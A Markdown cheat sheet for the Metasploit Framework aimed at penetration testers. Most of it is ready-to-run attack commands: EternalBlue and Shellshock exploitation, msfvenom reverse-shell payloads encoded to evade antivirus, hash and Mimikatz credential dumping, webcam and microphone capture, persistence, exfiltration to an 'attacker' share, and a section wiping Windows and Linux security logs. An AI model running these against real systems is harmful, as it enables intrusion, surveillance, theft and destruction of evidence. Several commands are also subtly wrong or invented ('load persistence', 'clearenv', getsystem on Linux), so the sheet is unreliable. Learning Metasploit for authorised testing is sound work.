# 🎯 Metasploit Framework - Complete Cheat Sheet

> **A Comprehensive Guide to Metasploit Framework for Penetration Testers**

## Table of Contents

1. [Installation & Setup](#installation--setup)
2. [Framework Basics](#framework-basics)
3. [Workspace Management](#workspace-management)
4. [Database & Credentials](#database--credentials)
5. [Module Operations](#module-operations)
6. [Exploitation](#exploitation)
7. [Payload Generation](#payload-generation)
8. [Meterpreter Sessions](#meterpreter-sessions)
9. [Post-Exploitation](#post-exploitation)
10. [Reporting & Cleanup](#reporting--cleanup)
11. [Useful Tips & Tricks](#useful-tips--tricks)

---

## Installation & Setup

### Windows Installation

```powershell
# Using Chocolatey (recommended)
choco install metasploit

# Or download from official website
# https://www.rapid7.com/products/metasploit/download/

# Start Metasploit
msfconsole

# Or with database
sudo service postgresql start
msfdb init
msfconsole -d
```

### Linux Installation (Debian/Ubuntu)

```bash
# Install dependencies
sudo apt-get update
sudo apt-get install postgresql

# Install Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfconsole.erb > msfconsole
chmod +x msfconsole

# Or use package manager
sudo apt-get install metasploit-framework

# Initialize database
sudo msfdb init

# Start Metasploit
msfconsole
```

### Kali Linux

```bash
# Already installed on Kali

# Start with database
sudo msfdb init
sudo msfconsole

# Or without database
msfconsole --offline
```

### Docker Installation

```bash
# Pull official image
docker pull metasploitframework/metasploit-framework

# Run container
docker run -it metasploitframework/metasploit-framework msfconsole
```

---

## Framework Basics

### Starting Metasploit

```bash
# Basic startup
msfconsole

# With specific database
msfconsole -d postgresql://user:pass@localhost/msf

# Offline mode (no database)
msfconsole --offline

# Quiet mode (suppress banner)
msfconsole -q

# Execute resource script
msfconsole -r script.rc

# Run single command then exit
msfconsole -c "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; exploit"
```

### Basic Commands

```bash
# Show help
help

# Exit/quit
exit
quit

# Clear screen
clear

# Show version
version

# Show banner
banner

# Show options
show options

# Search for modules
search <term>
search type:exploit windows
search cve:2024

# Search by rank
search rank:excellent

# Show history
history

# Reload modules
reload_all

# Show active sessions
sessions

# Set verbosity
set verbose true
set debug true
```

### Command Syntax

```bash
# Basic syntax
<command> [option] [value]

# Examples
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
unset RHOSTS
unset all
```

---

## Workspace Management

### Workspace Commands

```bash
# List all workspaces
workspace

# Create workspace
workspace -a <name>
workspace -a pentest_2024

# Switch workspace
workspace <name>
workspace pentest_2024

# Delete workspace
workspace -d <name>
workspace -d pentest_2024

# Rename workspace
workspace -r <old_name> <new_name>
workspace -r pentest_2024 client_pentest

# Show active workspace
workspace

# Workspace with description
workspace -a <name> "<description>"
```

### Managing Workspace Data

```bash
# Import scan results
db_import <nmap_file>
db_import nmap_scan.xml

# Export workspace
db_export -f xml > export.xml
db_export -f csv > export.csv
db_export -f pwdump > export.txt

# Backup workspace
cp -r ~/.msf4/db/workspaces/<workspace> backup/
```

---

## Database & Credentials

### Database Commands

```bash
# Check database status
db_status

# Reinitialize database
db_rebuild

# Delete workspace data
db_delete_all

# Disconnect from database
db_disconnect

# Connect to database
db_connect postgresql://user:password@localhost/msfdb

# Create new database
createdb msf4_db
sudo service postgresql start
```

### Hosts Management

```bash
# List all hosts
hosts
hosts -c address,os_name,os_flavor

# Add host
hosts -a 192.168.1.100 -m "Windows Server 2019"

# Delete host
hosts -d 192.168.1.100

# Search hosts
hosts -S "Windows"
hosts -S "192.168"

# Get detailed info
hosts 192.168.1.100

# Export hosts
hosts -o hosts.csv
```

### Services Management

```bash
# List services
services
services -p 445
services -u ssh
services -h 192.168.1.100

# Get specific service
services -s "smb"
services -s "http"

# Count services
services -c count

# Delete service
services -d 192.168.1.100 445
```

### Vulnerabilities

```bash
# List vulnerabilities
vulns
vulns -h 192.168.1.100

# Search vulnerabilities
vulns -n "ms17_010"
vulns -s "eternalblue"

# Get vulnerability details
vulns -h 192.168.1.100 -S "critical"

# Export vulns
vulns -o vulns.csv
```

### Credentials Management

```bash
# List all credentials
creds
creds -c data

# Add credentials
creds add -u admin -p password123 -H 192.168.1.100

# Filter credentials
creds -c realm
creds -u admin
creds -t password

# Delete credentials
creds -d 1

# Export credentials
creds -o creds.csv

# Search credentials
creds -S password123
```

### Loot Management

```bash
# List loot
loot
loot -l
loot -h 192.168.1.100

# Get specific loot
loot -t "windows/security/sam"
loot -t "windows/registry/hive"

# Delete loot
loot -d <id>

# Export loot location
loot -t "password.txt"
cat /path/to/loot/
```

---

## Module Operations

### Finding Modules

```bash
# Search syntax
search type:exploit
search type:payload
search type:auxiliary
search type:encoder
search type:nop

# Search by platform
search platform:windows
search platform:linux
search platform:solaris

# Search by rank
search rank:excellent
search rank:great
search rank:good
search rank:normal
search rank:low
search rank:manual

# Search combinations
search type:exploit platform:windows rank:excellent
search cve:2024 platform:linux
search app:apache type:exploit

# List all modules by type
search type:exploit -a
search type:payload -a
```

### Loading Modules

```bash
# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
use exploit/multi/handler

# Use payload
use payload/windows/meterpreter/reverse_tcp
use payload/linux/x86/meterpreter/reverse_tcp

# Use auxiliary
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/dir_scanner

# Use encoder
use encoders/x86/shikata_ga_nai

# Show current module
info
```

### Module Information

```bash
# Show full module info
info
show info

# Show options
show options
show required

# Show payloads available
show payloads

# Show targets
show targets
set TARGET <number>

# Show exploits/stagers
show exploits
show stagers

# Show advanced options
show advanced

# Show evasion options
show evasion
```

### Setting Options

```bash
# Set required option
set RHOSTS 192.168.1.100
set RHOSTS 192.168.1.0/24
set RHOSTS file:/path/to/targets.txt

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# Set listener options
set LHOST 192.168.1.50
set LPORT 4444

# Set advanced options
set ENCODING x86/shikata_ga_nai
set ConnectTimeout 30

# Unset option
unset RHOSTS
unset all

# Save options
save_options <module_path>
```

---

## Exploitation

### Pre-Exploitation

```bash
# Check if target is vulnerable
check
check -h 192.168.1.100

# Run vulnerability scan
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.100
run

# Enumerate services
use auxiliary/scanner/http/http_enumeration
set RHOSTS 192.168.1.100
run
```

### Running Exploits

```bash
# Basic exploitation
exploit
exploit -h 192.168.1.100
exploit -z (background)
exploit -j (job mode)

# With specific target
set TARGET 1
exploit

# Multiple targets
set RHOSTS 192.168.1.0/24
exploit

# Run as background job
exploit -j
jobs -l
jobs -i 1 (interact)
jobs -k 1 (kill)

# Check and exploit in one
check && exploit

# Timeout settings
set ExitOnSession false
exploit
```

### Session Management

```bash
# List all sessions
sessions
sessions -l

# Interact with session
sessions -i 1
sessions -i -1 (latest session)

# Background session
background

# Kill session
sessions -k 1
sessions -k -1

# Rename session
sessions -r 1 "my_session"

# Run command in session
sessions -c "whoami" -i 1

# Session info
sessions -i 1
sysinfo

# Upgrade shell to Meterpreter
sessions -u 1
```

---

## Payload Generation

### MSFVenom - Payload Creation

```bash
# Basic syntax
msfvenom -p <payload> [options] -f <format>

# Windows Meterpreter (32-bit)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe

# Windows Meterpreter (64-bit)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell64.exe

# Windows Reverse Shell
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > cmd_shell.exe

# Linux Meterpreter (x86)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > shell.elf

# Linux Meterpreter (x64)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > shell64.elf

# PHP Meterpreter
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.php

# JSP Meterpreter
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.jsp

# ASP.NET Meterpreter
msfvenom -p aspx/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx > shell.aspx

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.py
```

### Payload Encoding

```bash
# Single encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -f exe > encoded.exe

# Multiple encoding iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe > multi_encoded.exe

# Using different encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
  -e x86/fnstenv_mov -f exe > encoded2.exe

# List encoders
msfvenom -l encoders
```

### Payload Formats

```bash
# Format options
-f exe          # Windows executable
-f elf          # Linux executable
-f dll          # Dynamic Link Library
-f so           # Linux shared object
-f raw          # Raw payload
-f c            # C code
-f python       # Python code
-f php          # PHP code
-f asp          # ASP
-f aspx         # ASP.NET
-f jsp          # Java Server Pages
-f war          # Web Application Archive
-f perl         # Perl code
-f ruby         # Ruby code
-f bash         # Bash script
-f sh           # Shell script
```

### Advanced Options

```bash
# Show available options
msfvenom -p windows/meterpreter/reverse_tcp --list-options

# Custom variables
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
  EXITFUNC=process -f exe > shell.exe

# Multiple payloads
msfvenom -p windows/meterpreter/reverse_tcp -p windows/meterpreter_reverse_https \
  LHOST=192.168.1.50 LPORT=4444 -f exe > multi.exe

# Generate template
msfvenom -p windows/meterpreter/reverse_tcp -f exe > /tmp/template.exe

# Bad character filtering
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 \
  -b '\x00\x0a\x0d' -f exe > filtered.exe
```

---

## Meterpreter Sessions

### Basic Meterpreter Commands

```bash
# System information
sysinfo
getuid
getpid
getprivs
getenv [var]
hostname
pwd

# Working with directories
cd <path>
ls
dir
mkdir <dirname>
rmdir <dirname>

# File operations
download <remote> <local>
upload <local> <remote>
cat <file>
type <file>
del <file>
rm <file>
cp <source> <dest>

# Process info
ps
ps -S <name>
getpid

# Process management
kill <pid>
migrate <pid>
execute -f <cmd>
execute -f cmd.exe -a "/c whoami"
execute -H -f cmd.exe -a "/c systeminfo"

# Thread commands
thread <pid>
```

### Privilege Escalation (Meterpreter)

```bash
# Check current privileges
getuid
getprivs

# Get system
getsystem
getsystem -t 1
getsystem -t all

# Token impersonation
load incognito
list_tokens -u
list_tokens -g
impersonate_token "DOMAIN\\Administrator"
whoami

# Dump hashes
hashdump

# Load Mimikatz
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
```

### Network Commands

```bash
# Get IP configuration
ipconfig
ipconfig -a
ifconfig (Linux)

# Routing table
route
route print

# ARP table
arp
arp -a

# Network connections
netstat
netstat -ano

# DNS
nslookup <domain>

# Ping
ping <host>
ping -c 4 <host>
```

### File System

```bash
# List files with details
ls -la
dir /s

# Search for files
search -r -f *.txt C:\\
search -r -f *.pdf /home

# File transfer
download -r <remote_dir> <local_dir>
upload -r <local_dir> <remote_dir>

# Edit file
edit <file>

# Get file hash
cat <file> | md5sum
```

### Registry Operations (Windows)

```bash
# Load registry module
load priv

# Registry queries
reg query HKLM\\Software\\Microsoft
reg queryv HKLM\\Software\\Microsoft\\Windows

# Registry set
reg set HKLM\\Software\\Test Value "data"

# Registry delete
reg deletev HKLM\\Software\\Test Value
reg deletek HKLM\\Software\\Test
```

### Webcam & Audio

```bash
# Load webcam module
load espia

# List webcams
webcam_list

# Take screenshot
screenshot

# Take webcam picture
webcam_snap -i 1

# Record audio
record_mic -d 10
record_mic -l 30

# List audio devices
audio_devices
```

### Persistence

```bash
# Load persistence module
load persistence

# Create persistence
persistence -X -i 60 -p windows/meterpreter/reverse_tcp \
  -r 192.168.1.50 -a 4444

# Scheduled task (Windows)
run scheduleme -m 3 -p windows/meterpreter/reverse_tcp \
  -o LHOST=192.168.1.50 LPORT=4444

# Cron job (Linux)
run at -i 3 -m 2 -p linux/x86/meterpreter/reverse_tcp \
  -o LHOST=192.168.1.50 LPORT=4444
```

---

## Post-Exploitation

### Information Gathering

```bash
# System info
sysinfo
systeminfo

# User info
getuid
whoami
getenv USERNAME
getenv USERDOMAIN

# Environment
getenv
set

# Running processes
ps
tasklist /v (Windows)

# Services
services
service list (Linux)

# Network config
ipconfig
ifconfig
route
arp

# Disk info
df (Linux)
dir (Windows)

# Schedule tasks
schtasks /query /fo LIST /v (Windows)
crontab -l (Linux)
```

### File Searching & Exfiltration

```bash
# Search for files
search -r -f "*.sql" C:\\
search -r -f "*.txt" /home

# Download files
download C:\\path\\to\\file.txt
download -r C:\\important\\folder

# Create archive
tar czf archive.tar.gz /path/to/data

# Exfiltrate via SMB
cp file.txt //attacker/share/

# Database dump
mysqldump -h 127.0.0.1 -u root -p<pass> --all-databases > dump.sql
```

### Credential Harvesting

```bash
# Dump SAM hashes
hashdump

# Mimikatz (kiwi module)
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

# SSH keys
cat /root/.ssh/id_rsa

# Browser cache
cat "C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"

# Bash history
cat ~/.bash_history
cat /root/.bash_history
```

### Lateral Movement

```bash
# Port forwarding
portfwd add -l 3389 -p 3389 -r 192.168.2.50
portfwd list
portfwd delete -l 3389

# Routing
run autoroute -s 192.168.2.0/24
run autoroute -p

# SOCKS proxy
use auxiliary/server/socks4a
set SRVPORT 9050
run

# Then with proxychains
proxychains nmap -sV 192.168.2.50
```

---

## Reporting & Cleanup

### Generating Reports

```bash
# Export database
db_export -f xml > report.xml
db_export -f csv > report.csv

# Generate from msfconsole
vulns -o vulns.txt
hosts -o hosts.txt
services -o services.txt
creds -o creds.txt

# Create report script
resource_script create_report.rc
```

### Clearing Evidence

```bash
# Clear command history
history -c

# Clear Meterpreter history
clearenv

# Remove files
del /S /Q C:\\Windows\\Temp\\*
rm -rf /tmp/*

# Clear logs
wevtutil cl Security
wevtutil cl System
cat /dev/null > /var/log/auth.log

# Clear session history
exit
```

---

## Useful Tips & Tricks

### Resource Scripts (.rc files)

```bash
# Create resource script
cat > exploit.rc << EOF
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -z
EOF

# Run resource script
resource exploit.rc
msfconsole -r exploit.rc
```

### Automation

```bash
# Background multiple exploits
exploit -z
exploit -z
exploit -z

# Monitor jobs
jobs -l
jobs -i 1

# Kill jobs
jobs -k 1
```

### Handlers

```bash
# Multi-handler
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
run -j (background)
```

### Database Integration

```bash
# Import nmap scan
db_import nmap_scan.xml

# Use scan results
hosts
services
vulns

# Search by scan
hosts -S "windows"
services -p 445
```

### Useful Shortcuts

```bash
# Quick search and use
use <partial_module_name>

# History
history 10 (last 10 commands)
history -c (clear history)
history -h (help)

# Grep in MSFconsole
hosts | grep "Windows"

# One-liners
echo "set RHOSTS 192.168.1.100" | msfconsole
```

---

## Common Workflows

### Windows Exploitation Workflow

```bash
# 1. Start framework
msfconsole

# 2. Search for exploits
search ms17_010

# 3. Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# 4. Show options
show options

# 5. Set required options
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# 6. Check vulnerability
check

# 7. Exploit
exploit

# 8. Interact with session
sessions -i 1

# 9. Post-exploitation
sysinfo
hashdump
getsystem
```

### Linux Exploitation Workflow

```bash
# 1. Search exploit
search kernel privilege

# 2. Use exploit
use exploit/linux/privilege_escalation/cve_2016_5195

# 3. Set payload
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# 4. Set target
set RHOSTS 192.168.1.101

# 5. Exploit
exploit

# 6. Upgrade shell
sessions -u 1

# 7. Escalate privileges
getsystem
```

### Web Application Exploitation

```bash
# 1. Search web exploits
search type:exploit app:apache

# 2. Use exploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec

# 3. Set target
set RHOSTS 192.168.1.102
set TARGETURI /cgi-bin/test.cgi

# 4. Run exploit
exploit

# 5. Web shell commands
execute -f "cat /etc/passwd"
```

---

## Troubleshooting

### Common Issues

| Issue | Solution |
|-------|----------|
| Database connection error | `sudo msfdb init && sudo service postgresql restart` |
| Module not found | `reload_all` or update Metasploit |
| Payload won't compile | Check encoding, format, or encode payload before use |
| Session dies immediately | Check firewall, antivirus, or set `ExitOnSession false` |
| Exploit fails silently | Run with `set verbose true` and `set debug true` |

### Debug Mode

```bash
# Enable verbose output
set verbose true

# Enable debug mode
set debug true

# Show all traffic
set LogLevel 3

# Save logs
set LogLevel 3
spool /tmp/msflog.txt
```

---

## Reference

### Module Types

| Type | Usage | Example |
|------|-------|---------|
| Exploit | Gain access | `exploit/windows/smb/ms17_010_eternalblue` |
| Payload | Deliver code | `payload/windows/meterpreter/reverse_tcp` |
| Auxiliary | Support tool | `auxiliary/scanner/smb/smb_version` |
| Encoder | Obfuscate code | `encoder/x86/shikata_ga_nai` |
| NOP | Padding | `nop/x86/single_byte_xor` |
| Post | Post-exploitation | `post/windows/escalate/getsystem` |

### Payload Types

| Payload | Use Case | Target |
|---------|----------|--------|
| reverse_tcp | Remote callback shell | Network accessible |
| bind_tcp | Listening shell | Attacker connects |
| reverse_https | Encrypted callback | HTTPS only |
| stageless | Single payload | Smaller size |
| staged | Multi-part | Better obfuscation |

---

## Security Notes

⚠️ **Legal & Ethical**

- Only test with explicit written authorization
- Respect target system boundaries
- Maintain confidentiality of findings
- Document all activities
- Follow applicable laws and regulations

✅ **Best Practices**

- Use separate testing environment
- Maintain clean logs
- Test thoroughly before production
- Backup important data
- Update Metasploit regularly
- Use VPN for remote testing

---

## Resources

### Official Documentation

- [Metasploit Official Docs](https://docs.rapid7.com/metasploit/)
- [Rapid7 Community](https://community.rapid7.com/)
- [GitHub Metasploit](https://github.com/rapid7/metasploit-framework)

### Learning

- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### Tools & Utilities

- [MSFVenom Guide](https://www.offensive-security.com/msfvenom-tutorial/)
- [Exploit Database](https://www.exploit-db.com/)
- [CVE Search](https://cve.mitre.org/)

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────┐
│ METASPLOIT QUICK REFERENCE                              │
├─────────────────────────────────────────────────────────┤
│ START:        msfconsole                                │
│ SEARCH:       search type:exploit platform:windows      │
│ USE:          use exploit/windows/smb/ms17_010          │
│ OPTIONS:      show options / set RHOSTS 192.168.1.100   │
│ RUN:          exploit / check                           │
│ SESSIONS:     sessions -i 1                             │
│ PAYLOAD:      msfvenom -p windows/meterpreter/... -f exe│
│ POST:         getsystem / hashdump / load kiwi          │
└─────────────────────────────────────────────────────────┘
```

---

## Changelog

- **v1.0** - Initial comprehensive cheat sheet
- **Last Updated** - June 2026
- **Status** - Production Ready
- **Format** - eJPT v2 Style Professional Documentation

---

**Created for penetration testers and security professionals.**

**Share responsibly. Test ethically. Learn continuously.**

---

© 2026 | Metasploit Cheat Sheet | Educational Purpose
